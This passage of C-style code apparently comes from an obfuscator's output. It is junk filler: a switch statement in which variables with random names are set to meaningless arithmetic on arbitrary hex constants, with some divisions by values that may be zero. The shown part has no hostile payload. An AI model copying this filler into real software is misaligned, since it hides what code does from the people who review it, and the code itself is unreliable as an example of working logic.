        i5caLMFj6WR = i5caLMFj6WR + 0x709f0e2 - iOnll8cfQzI * 0xcec1a8d - 3;
        iOnll8cfQzI = 0xcec1a8d - 0x1 + iiqjjcvErHG * 0x2 - 0x709f0e2 / 0x3 + 0x5d968a9;
        iJnoqJgYLbR = iiqjjcvErHG - 0x4 * 0x6683d94 + 0x1234 - 0x4567 + 0xcafe + i5caLMFj6WR % 0x432 / 0x2cfad2c - 0x23;
        break;
    case 3:
        i5caLMFj6WR = iJnoqJgYLbR * 2 * 0xcec1a8d - 4 + 0x709f0e2 + 12 + 34 + 0x6683d94;
        iOnll8cfQzI = i5caLMFj6WR - 43 + 0x5d968a9 * 3040 - 0xcec1a8d % 10 + 1 - 0x5d968a9;
        iJnoqJgYLbR = 0x5d968a9 - 33 + iiqjjcvErHG * 0x25 + 0x6683d94 - 3004 + 0xcec1a8d;
        iiqjjcvErHG = 0x6683d94 + 2905 % i5caLMFj6WR * 1996 + 0x2cfad2c - 70 * 0x709f0e2;
        break;
    case 4:
        iJnoqJgYLbR = i5caLMFj6WR - 36 +0x709f0e2 * 2001 - iOnll8cfQzI / 234 + 0x7;
        iiqjjcvErHG = iJnoqJgYLbR - 0xabcedf + 0xcec1a8d * 0xa2bc5 + iJnoqJgYLbR / 0x123 + 0x6683d94;
        iOnll8cfQzI = iiqjjcvErHG - 0x124 + 23 / i5caLMFj6WR / 3 / 2 + iOnll8cfQzI + 29 - 0xcec1a8d + 100;
        i5caLMFj6WR = 0xcec1a8d - 70 + 70  + 0x6683d94 / 2 + 423 - 0x6683d94 / 7749 % 0x1234;
        break;
    case 5:
        i5caLMFj6WR = i5caLMFj6WR - 9981 % iiqjjcvErHG + 111 - iOnll8cfQzI / 224 % 0x5d968a9;
        iOnll8cfQzI = iOnll8cfQzI - 339 - iOnll8cfQzI * 4416 / 0x709f0e2 + 5525 + 0xcec1a8d % 10;
        iJnoqJgYLbR = iJnoqJgYLbR - 6636 + 0xcec1a8d * 7749 + 1 - i5caLMFj6WR * 8864 / 0xfecba;
        iiqjjcvErHG = 0x709f0e2 - 9981 % 0x6683d94 % 10 % 1010100 - 0x6683d94 - 23 -  0x709f0e2 - 2500;
        break;
}
i40AOFvF7oV = iJnoqJgYLbR - 0xaa + 0x5d968a9 * 46 - 15 / iOnll8cfQzI + 11 - 0x6683d94;
i40AOFvF7oV = i40AOFvF7oV - 70 * 55 - iOnll8cfQzI ^ 0x99 - 0x567498 % 0x6683d94 % 2 - 234 + 0xcec1a8d;

	// printf("%s\n",result);
	return;
}
